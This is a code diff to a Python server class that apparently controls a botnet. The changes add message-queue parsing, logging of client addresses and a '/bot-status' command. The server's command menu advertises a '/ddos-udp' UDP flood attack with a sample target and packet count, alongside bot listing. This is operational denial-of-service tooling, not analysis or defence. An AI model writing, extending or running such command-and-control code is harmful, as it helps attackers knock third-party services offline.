@@ -50,7 +50,7 @@ class Server:
         self.Q = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.Q.connect(('localhost', 7777))
 
-    def log(self, type, data):
+    def log(self, type, data) -> None:
         serverTitle = Style.BRIGHT + Fore.BLUE + "Server[OUT](Con.Log)" + Style.NORMAL
         deepData = data
         data = f"{serverTitle} : {data}"
@@ -104,11 +104,11 @@ class Server:
             client_thread.start()
             self.Deeplogger.info(f"new Thread {client_address}")
 
-    def get_raddr(self, socket_string):
+    def get_raddr(self, socket_string) -> (int, str):
         start_index = socket_string.find("raddr=(")
 
         if start_index == -1:
-            return None, None
+                return None, None
 
         end_index = socket_string.find(")", start_index + 7)
         if end_index == -1:
@@ -120,34 +120,55 @@ class Server:
         ip = raddr_list[0].strip("'")
         port = int(raddr_list[1])
 
-        ip = socket_string
-        port = 0
         return ip, port
-    
+        
     def handle_client(self, client_socket):
         while True:
             try:
                 message = client_socket.recv(1024).decode()
-                
-                if message != "":
-                    m = message.encode()
-                    self.Q.send(m)
+                tildaCount = message.count("~")
+
+                self.Deeplogger.debug(f"Fmsg >> {message}")
+
+                if tildaCount > 1:
+                    queue = message.split("~")
+                    self.Deeplogger.debug(f"![i] queue -> {queue}")
+                    for request in queue:
+                        if request != "":
+                            ip, port = self.get_raddr(str(client_socket)) 
+                            data = f"{request}&{ip}&{port}"        
+                            dts = data.encode()
+
+                            self.Deeplogger.debug(f"handler data in queue : {data}")
+                            
+                            self.Q.send(dts)
 
                 else:
-                    self.clients.remove(client_socket)
-                    break
+                    self.Deeplogger.debug(f"[!Q] Empty queue >> {message}")     
+                    ip, port = self.get_raddr(str(client_socket)) 
+                    data = f"{message}&{ip}&{port}"
+                    self.Deeplogger.debug(f"data to Query Server : {data}")          
+                    data = data.replace("~", "")
+                    if message != "":
+                        dts = data.encode()
+                        self.Q.send(dts)
+
+                    else:
+                        self.clients.remove(client_socket)
+                        break
             except:
                 self.clients.remove(client_socket)
                 break
 
-    def broadcast(self, message):        
+    def broadcast(self, message:str):        
         for client in self.clients:
             client.send(message.encode())
 
 
-    def source(self, cmd):
+    def source(self, cmd:str):
         cmdList = ["/msg : Broadcast",
-                   "/ddos-udp : Start a udp flood attack [ usage > /ddos-udp 127.0.0.1 53 -c 128000 ]"
+                   "/ddos-udp : Start a udp flood attack [ usage > /ddos-udp 127.0.0.1 53 -c 128000 ]",
+                   "/bot-status : Bots return connection status on Query Server",
                    "@bot : Bot list",
                    "$panic : to server down",
                    "$log : show last n loggs",
@@ -195,11 +216,11 @@ class Server:
                     loggsEnd = Fore.YELLOW + "END" + Fore.RESET
 
                     print(f"\n{title}")
-                    print("="*64, loggsT, "="*64, "\n")          
+                    print("="*64, loggsT, "="*60, "\n")          
                     for log in lastnlines:
                         print("{log}"+f" {log}\n")
 
-                    print("="*64, loggsEnd, "="*64)          
+                    print("="*64, loggsEnd, "="*60)          
 
             elif cmd == '$lds':
                 self.lds.shw(self.host, self.port)
